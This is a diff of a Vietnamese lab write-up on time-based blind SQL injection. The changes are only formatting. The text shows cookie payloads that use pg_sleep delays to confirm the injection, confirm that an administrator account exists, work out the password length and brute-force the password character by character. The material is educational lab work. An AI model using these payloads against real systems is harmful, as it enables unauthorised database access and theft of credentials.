@@ -17,11 +17,11 @@ Yêu cầu của bài lab:
 
 TrackingId=DOARdFNq3IYPxhVz'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END--
 
-  + 1=1 luôn đúng.
++1=1 luôn đúng.
 
-+ Hệ quả: câu lệnh sẽ gọi pg_sleep(5), ứng dụng mất 5 giây để phản hồi.
++Hệ quả: câu lệnh sẽ gọi pg_sleep(5), ứng dụng mất 5 giây để phản hồi.
 
-+ Mục đích: kiểm tra xem server có thực thi payload time-based và trả về theo thời gian.
++Mục đích: kiểm tra xem server có thực thi payload time-based và trả về theo thời gian.
 
 ![Hình 2 - Payload: ... CASE WHEN (1=1) THEN pg_sleep(5) ...]( images/image_2.png)
 
@@ -30,11 +30,11 @@ TrackingId=DOARdFNq3IYPxhVz'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(5)+ELSE+pg_s
 
 TrackingId=DOARdFNq3IYPxhVz'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END--;
 
-+ 1=2 luôn sai.
++1=2 luôn sai.
 
-+ Hệ quả: sẽ chạy pg_sleep(0). Dẫn đến không có delay, response trả ngay.
++Hệ quả: sẽ chạy pg_sleep(0). Dẫn đến không có delay, response trả ngay.
 
-+ Mục đích: xác nhận rằng chỉ khi điều kiện đúng mới có delay, nên ta có thể dùng delay để biểu thị boolean true/false.
++Mục đích: xác nhận rằng chỉ khi điều kiện đúng mới có delay, nên ta có thể dùng delay để biểu thị boolean true/false.
 
 ![Hình 3 -  Payload: ... CASE WHEN (1=2) THEN pg_sleep(5) ...]( images/image_3.png)
 
@@ -47,7 +47,7 @@ TrackingId=DOARdFNq3IYPxhVz'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+
 Response trả về delay 5s, vậy có thể suy luận rằng bảng users có username administrator
 
 ## B3: Xác định password có bao nhiêu kí tự
--Thay giá trị cookie thành:
+- Thay giá trị cookie thành:
 
 TrackingId=DOARdFNq3IYPxhVz'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users—
 
@@ -55,7 +55,7 @@ TrackingId=DOARdFNq3IYPxhVz'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LE
 
 Response delay 5s, vậy độ dài mật khẩu lớn hơn 1 ký tự.
 
--Thay giá trị cookie thành:
+- Thay giá trị cookie thành:
 
 TrackingId=DOARdFNq3IYPxhVz'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>5)+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users—
 
@@ -63,7 +63,7 @@ TrackingId=DOARdFNq3IYPxhVz'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LE
 
 Response delay 5s, vậy độ dài mật khẩu lớn hơn 5 ký tự.
 
--Thay giá trị cookie thành:
+- Thay giá trị cookie thành:
 
 TrackingId=DOARdFNq3IYPxhVz'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>10)+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users—
 
@@ -71,7 +71,7 @@ TrackingId=DOARdFNq3IYPxhVz'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LE
 
 Response delay 5s, vậy độ dài mật khẩu lớn hơn 10 ký tự.
 
--Thay giá trị cookie thành:
+- Thay giá trị cookie thành:
 
 TrackingId=DOARdFNq3IYPxhVz'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>20)+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users—
 
@@ -79,7 +79,7 @@ TrackingId=DOARdFNq3IYPxhVz'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LE
 
 Response không bị delay, độ dài mật khẩu <= 20
 
--Thay giá trị cookie thành:
+- Thay giá trị cookie thành:
 
 TrackingId=DOARdFNq3IYPxhVz'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)=20)+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users—
 
@@ -108,7 +108,8 @@ Response không bị delay, vậy kí tự đầu tiên không phải là kí t�
 ![Hình 13 – Payload 2](images/image_13.png)
 
 - Start attack và kết quả:
-+ Vì request nào delay lâu thì có khả năng nó sẽ true, lọc nhưng request có nhưng response received lớn bất thường và lấy payload 1 và payload 2 tương ứng của nó
+
+Vì request nào delay lâu thì có khả năng nó sẽ true, lọc nhưng request có nhưng response received lớn bất thường và lấy payload 1 và payload 2 tương ứng của nó
 ![Hình 14 – Start Attack](images/image_14.png)
 ![Hình 15 – Start Attack](images/image_15.png)
 ![Hình 16 – Start Attack](images/image_16.png)
